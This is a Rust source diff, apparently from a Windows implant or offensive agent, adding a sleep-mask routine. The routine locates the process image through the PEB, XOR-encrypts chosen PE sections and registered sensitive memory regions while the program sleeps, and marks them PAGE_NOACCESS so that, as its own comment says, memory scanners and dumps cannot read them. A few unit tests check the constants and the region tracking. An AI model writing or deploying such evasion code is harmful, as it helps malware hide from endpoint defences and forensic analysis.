@@ -257,19 +257,104 @@ where
     result
 }
 
-/// Product sleep-crypto enter: suspend peers → mask PE sections + whitelist regions.
+/// PAGE_NOACCESS / PAGE_READWRITE for sleep mask region protection.
+const PAGE_NOACCESS: u32 = 0x01;
+const PAGE_READWRITE: u32 = 0x04;
+
+/// Collect PE section ranges that sleep-mask encrypts (same selection as mask_pe_sections_inner).
+#[cfg(windows)]
+unsafe fn sleep_mask_section_ranges() -> Vec<(*mut u8, usize)> {
+    let mut out = Vec::new();
+    let image_base: *const u8;
+    #[cfg(target_arch = "x86_64")]
+    {
+        std::arch::asm!(
+            "mov rax, gs:[0x60]",
+            "mov rax, [rax + 0x10]",
+            out("rax") image_base,
+        );
+    }
+    #[cfg(not(target_arch = "x86_64"))]
+    {
+        image_base = std::ptr::null();
+    }
+    if image_base.is_null() {
+        return out;
+    }
+    let dos_header = image_base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
+    if (*dos_header).e_magic != 0x5A4D {
+        return out;
+    }
+    #[cfg(target_arch = "x86_64")]
+    let nt_headers = image_base
+        .offset((*dos_header).e_lfanew as isize)
+        as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+    #[cfg(not(target_arch = "x86_64"))]
+    let nt_headers = image_base
+        .offset((*dos_header).e_lfanew as isize)
+        as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
+    let section_header = nt_headers
+        .cast::<u8>()
+        .offset(24 + (*nt_headers).FileHeader.SizeOfOptionalHeader as isize)
+        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+    let section_count = (*nt_headers).FileHeader.NumberOfSections;
+    let target_names: &[&[u8]] = &[b".data", b".rdata", b".pdata", b".rsrc"];
+    for i in 0..section_count {
+        let section = section_header.add(i as usize);
+        let should_mask = target_names.iter().any(|&target| {
+            let mut matches = true;
+            for j in 0..target.len() {
+                if target[j] != (*section).Name[j] {
+                    matches = false;
+                    break;
+                }
+            }
+            matches
+        });
+        let chars = (*section).Characteristics;
+        if (chars & 0x20000000) != 0 {
+            continue;
+        }
+        if !should_mask {
+            continue;
+        }
+        let section_addr = image_base.offset((*section).VirtualAddress as isize) as *mut u8;
+        let section_size = *(*section).Misc.VirtualSize() as usize;
+        if section_size == 0 {
+            continue;
+        }
+        out.push((section_addr, section_size));
+    }
+    out
+}
+
+/// Product sleep-crypto enter: suspend peers → mask → PAGE_NOACCESS on masked regions.
 /// Does **not** XOR the process default heap (that races Tokio and is opt-in unsafe only).
 #[cfg(windows)]
 pub unsafe fn sleep_mask_enter(key: &[u8]) {
     with_threads_suspended(|| {
         mask_pe_sections(key);
         mask_sensitive_regions(key);
+        // While asleep, denylist reads of ciphertext (memory scanners / dumps).
+        for (addr, size) in sleep_mask_section_ranges() {
+            let _ = protect_region(addr, size, PAGE_NOACCESS);
+        }
+        for (addr, size) in sensitive_region_ranges() {
+            let _ = protect_region(addr, size, PAGE_NOACCESS);
+        }
     });
 }
 
 #[cfg(windows)]
 pub unsafe fn sleep_mask_leave(key: &[u8]) {
     with_threads_suspended(|| {
+        // Restore RW before XOR-decrypt so writes succeed.
+        for (addr, size) in sleep_mask_section_ranges() {
+            let _ = protect_region(addr, size, PAGE_READWRITE);
+        }
+        for (addr, size) in sensitive_region_ranges() {
+            let _ = protect_region(addr, size, PAGE_READWRITE);
+        }
         mask_sensitive_regions(key);
         mask_pe_sections(key);
     });
@@ -354,6 +439,40 @@ pub unsafe fn mask_sensitive_regions(key: &[u8]) {
 /// Test helper: count registered regions.
 pub fn sensitive_region_count() -> usize {
     SENSITIVE_REGIONS.lock().map(|g| g.len()).unwrap_or(0)
+}
+
+/// Snapshot of registered sensitive regions for PAGE_NOACCESS during sleep.
+fn sensitive_region_ranges() -> Vec<(*mut u8, usize)> {
+    let mut out = Vec::new();
+    if let Ok(g) = SENSITIVE_REGIONS.lock() {
+        for r in g.iter() {
+            if r.ptr != 0 && r.len != 0 {
+                out.push((r.ptr as *mut u8, r.len));
+            }
+        }
+    }
+    out
+}
+
+/// Unit-testable: after mask enter, section protect intent is NOACCESS (constant + helper present).
+#[cfg(test)]
+mod sleep_noaccess_tests {
+    use super::{PAGE_NOACCESS, PAGE_READWRITE, sensitive_region_ranges, register_sensitive_region, unregister_sensitive_region};
+
+    #[test]
+    fn page_noaccess_constant_is_windows_noaccess() {
+        assert_eq!(PAGE_NOACCESS, 0x01);
+        assert_eq!(PAGE_READWRITE, 0x04);
+    }
+
+    #[test]
+    fn sensitive_region_ranges_tracks_registered() {
+        let mut buf = [0u8; 16];
+        let id = register_sensitive_region(buf.as_mut_ptr(), buf.len(), 9);
+        let ranges = sensitive_region_ranges();
+        assert!(ranges.iter().any(|(p, l)| *p == buf.as_mut_ptr() && *l == 16));
+        unregister_sensitive_region(id);
+    }
 }
 
 #[cfg(test)]
